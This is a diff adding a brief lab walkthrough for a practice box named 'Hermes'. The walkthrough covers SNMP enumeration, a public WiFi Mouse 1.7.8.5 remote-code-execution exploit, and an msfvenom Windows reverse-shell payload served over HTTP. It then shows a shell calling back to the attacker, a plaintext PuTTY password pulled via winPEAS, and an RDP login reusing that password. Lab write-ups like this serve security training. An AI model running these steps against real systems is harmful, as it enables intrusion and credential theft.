@@ -84,7 +84,48 @@ User chloe may run the following commands on oscp:
 root@oscp:~# cat proof.txt
 
 # HERMES
+snmpwalk -c public -v1 192.168.162.145 
+...
+iso.3.6.1.2.1.1.4.0 = STRING: "zachary"
+iso.3.6.1.2.1.25.6.3.1.2.12 = STRING: "Mouse Server version 1.7.8.5"
+...
 
+# Found the server is actually using Mouse Server version 1.7.8.5
+searchsploit mouse
+...
+WiFi Mouse 1.7.8.5 - Remote Code Execution                                        | windows/remote/49601.py
+WiFi Mouse 1.7.8.5 - Remote Code Execution(v2)                                    | windows/remote/50972.py
+...
+searchsplot -m 50972 
 
+msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.45.165 LPORT=8888 -f exe -o met.exe
 
+python3 50972.py 192.168.162.145 192.168.45.165 met.exe
+# Lel seem like not working.. Lets change to 49601
+python3 -m http.server 80 # on the payload folder 
+python2 50972.py 192.168.162.145 192.168.45.165 reverse.exe
+# In the end I found out is the http server need to be host...
+[*] Command shell session 1 opened (192.168.45.165:8888 -> 192.168.162.145:52032) at 2024-06-02 23:52:01 +0800
 
+C:\Users\offsec\Desktop>type local.txt
+# Upload winpeas and run
+...
+  [?] Windows vulns search powered by Watson(https://github.com/rasta-mouse/Watson)
+ [*] OS Version: 2004 (19041)
+ [*] Enumerating installed KBs...
+ [!] CVE-2020-1013 : VULNERABLE
+  [>] https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/     
+  C:\Users\offsec\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+  Interesting files and registry 
+  Putty Sessions
+    RegKey Name: zachary
+    RegKey Value: "&('C:\Program Files\PuTTY\plink.exe') -pw 'Th3R@tC@tch3r' zachary@10.51.21.12 'df -h'"
+C:\Users\offsec\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt
+...
+# Now we owned the zachary passwords, lets try rdp
+# From other writeups, we can use powershell to query
+reg query HKCU\Software\SimonTatham\PuTTY\Sessions
+
+xfreerdp /u:zachary /p:Th3R@tC@tch3r /v:192.168.162.145 /cert-ignore
+# Run powershell as Admin
+PS C:\Users\Administrator\Desktop> type proof.txt
